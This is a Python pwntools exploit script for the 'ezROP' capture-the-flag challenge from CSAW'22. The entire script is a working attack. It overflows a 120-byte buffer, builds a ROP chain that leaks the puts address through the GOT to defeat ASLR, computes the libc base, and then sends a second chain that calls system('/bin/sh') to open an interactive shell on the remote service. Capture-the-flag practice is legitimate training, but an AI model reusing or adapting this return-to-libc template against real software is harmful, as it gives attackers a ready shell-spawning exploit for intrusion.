#!/usr/bin/env python3

from pwn import *

elf = ELF('./ezROP')
io = remote('pwn.chal.csaw.io',5002)
libc = ELF('./libc.so.6')

# io = process('./ezROP')
# libc = elf.libc

#c = input(f'gdb: {io.pid}')

buffer = 120
POP_RDI = 0x004015a3
RET = 0x004015c4

payload = b'\x00'*buffer + p64(POP_RDI) + p64(elf.got.puts) + p64(elf.plt.puts) + p64(elf.sym.main)

io.recvuntil(b'name?\n')
io.sendline(payload)
io.recvuntil(b"CSAW'22!\n")
leaked = u64(io.recv(6) + bytes(2))
libc.address = leaked - libc.sym.puts
print(f'libc? :{hex(libc.address)}')

shell = b'\x00'*buffer + p64(RET) + p64(POP_RDI) + p64(next(libc.search(b'/bin/sh\x00'))) + p64(libc.sym.system)
io.recvuntil(b'name?\n')
io.sendline(shell)

io.interactive()
	